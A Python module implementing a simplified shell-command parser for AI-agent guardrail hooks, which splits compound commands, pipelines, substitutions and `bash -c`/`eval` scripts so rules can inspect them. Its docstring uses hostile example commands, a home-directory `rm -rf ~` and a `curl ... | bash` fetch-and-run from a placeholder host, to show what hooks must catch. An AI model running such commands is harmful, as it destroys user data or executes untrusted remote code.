"""A small shell-command parser for guardrail hooks.

Claude Code's own permission matcher splits compound commands before it matches rules
(&&, ||, ;, |, &, newlines) and looks inside subshells and command substitutions. A hook
that inspects only the first word of the command would miss `cd /tmp && rm -rf ~`, so the
lab's hooks use this parser to see every command that would actually run.

    parse("cd x && curl -s https://e.invalid/x.sh | bash")
    -> [[["cd", "x"]], [["curl", "-s", "https://e.invalid/x.sh"], ["bash"]]]

The result is a list of pipelines. A pipeline is a list of stages joined by `|`, and each
stage is an argv list. Along the way the parser:

  - extracts $(...) and `...` substitutions and parses them as pipelines of their own,
  - parses the script of `bash -c '...'` / `sh -c` / `eval` as pipelines of their own
    (the outer `bash -c ...` stage stays too),
  - strips leading VAR=value assignments and the wrappers timeout, time, nice, nohup,
    stdbuf, command, builtin and `env VAR=1 cmd` (a bare `env` stays: it prints the env),
  - keeps redirection targets as arguments (`echo x > .env` -> ["echo", "x", ".env"]),
    so a rule that looks for a secret path in the arguments also sees redirections.

It is deliberately simple. It is not a full shell grammar (no heredocs, no functions, no
globbing or variable expansion), which is one reason a hook is a guardrail and not a sandbox.
"""

from __future__ import annotations

import os
import re
import shlex

Argv = list[str]
Pipeline = list[Argv]

SEPARATORS = {";", "&&", "||", "&", "(", ")", ";;", ";&"}
PIPES = {"|", "|&"}
REDIRECTS = {">", ">>", "<", "<<", "<<<", ">&", "&>", "&>>", ">|", "<&", "<>"}
SHELLS = {"sh", "bash", "zsh", "dash", "ksh"}
_ASSIGN = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")


def program(argv: Argv) -> str:
    """The program name of a stage, without its directory: '/usr/bin/curl' -> 'curl'."""
    return os.path.basename(argv[0]) if argv else ""


def _extract_substitutions(command: str) -> tuple[str, list[str]]:
    """Replace $(...) and `...` with a placeholder; return (outer text, inner scripts)."""
    out, inner, i, n = [], [], 0, len(command)
    in_single = False
    while i < n:
        c = command[i]
        if c == "'" and not in_single:
            j = command.find("'", i + 1)
            if j == -1:
                out.append(command[i:])
                break
            out.append(command[i : j + 1])
            i = j + 1
            continue
        if c == "\\" and i + 1 < n:
            out.append(command[i : i + 2])
            i += 2
            continue
        if c == "$" and i + 1 < n and command[i + 1] == "(":
            depth, j = 1, i + 2
            while j < n and depth:
                if command[j] == "(":
                    depth += 1
                elif command[j] == ")":
                    depth -= 1
                j += 1
            inner.append(command[i + 2 : j - 1] if depth == 0 else command[i + 2 :])
            out.append(" __SUBST__ ")
            i = j
            continue
        if c == "`":
            j = command.find("`", i + 1)
            if j == -1:
                j = n
            inner.append(command[i + 1 : j])
            out.append(" __SUBST__ ")
            i = j + 1
            continue
        out.append(c)
        i += 1
    return "".join(out), inner


def _tokens(text: str) -> list[str]:
    text = text.replace("\r", "").replace("\n", " ; ")
    try:
        lex = shlex.shlex(text, posix=True, punctuation_chars=True)
        lex.whitespace_split = True
        lex.commenters = ""
        return list(lex)
    except ValueError:  # unbalanced quotes: fall back to a plain split
        return text.split()


_WRAPPERS_SIMPLE = {"time", "nohup", "command", "builtin", "noglob", "exec"}


def _strip(argv: Argv) -> Argv:
    """Drop VAR=value prefixes and wrapper programs, repeatedly."""
    changed = True
    while argv and changed:
        changed = False
        while argv and _ASSIGN.match(argv[0]):
            argv = argv[1:]
            changed = True
        if not argv:
            break
        p = program(argv)
        if p in _WRAPPERS_SIMPLE and len(argv) > 1 and not (p == "command" and argv[1] == "-v"):
            argv, changed = argv[1:], True
        elif p == "timeout" and len(argv) > 1:
            rest = argv[1:]
            while rest and rest[0].startswith("-"):
                rest = rest[2:] if rest[0] in ("-s", "-k", "--signal", "--kill-after") else rest[1:]
            argv, changed = (rest[1:] if rest else []), True
        elif p == "nice" and len(argv) > 1:
            rest = argv[1:]
            if rest and rest[0] == "-n":
                rest = rest[2:]
            elif rest and rest[0].startswith("-"):
                rest = rest[1:]
            argv, changed = rest, True
        elif p == "stdbuf" and len(argv) > 1:
            rest = argv[1:]
            while rest and rest[0].startswith("-"):
                rest = rest[1:]
            argv, changed = rest, True
        elif p == "env" and len(argv) > 1:
            rest = argv[1:]
            while rest and (rest[0].startswith("-") or _ASSIGN.match(rest[0])):
                rest = rest[1:]
            if rest:  # `env FOO=1 cmd` runs cmd; a bare `env FOO=1` just prints, keep it
                argv, changed = rest, True
    return argv


def _split(tokens: list[str]) -> list[Pipeline]:
    pipelines: list[Pipeline] = []
    stage: Argv = []
    pipe: Pipeline = []

    def end_stage():
        nonlocal stage
        if stage:
            pipe.append(stage)
        stage = []

    def end_pipe():
        nonlocal pipe
        end_stage()
        if pipe:
            pipelines.append(pipe)
        pipe = []

    for t in tokens:
        if t in SEPARATORS:
            end_pipe()
        elif t in PIPES:
            end_stage()
        elif t in REDIRECTS:
            continue  # keep the target that follows as an ordinary argument
        else:
            stage.append(t)
    end_pipe()
    return pipelines


def parse(command: str, _depth: int = 0) -> list[Pipeline]:
    """Parse a shell command into pipelines of argv stages (see the module docstring)."""
    if _depth > 5 or not command or not command.strip():
        return []
    outer, inner = _extract_substitutions(command)
    result: list[Pipeline] = []
    for pipe in _split(_tokens(outer)):
        cleaned = [s for s in (_strip(st) for st in pipe) if s]
        if not cleaned:
            continue
        result.append(cleaned)
        for st in cleaned:
            p = program(st)
            if p in SHELLS and "-c" in st:
                k = st.index("-c")
                if k + 1 < len(st):
                    result.extend(parse(st[k + 1], _depth + 1))
            elif p == "eval" and len(st) > 1:
                result.extend(parse(" ".join(st[1:]), _depth + 1))
    for script in inner:
        result.extend(parse(script, _depth + 1))
    return result


def stages(command: str) -> list[Argv]:
    """Every stage of every pipeline, flattened. Handy when order does not matter."""
    return [st for pipe in parse(command) for st in pipe]
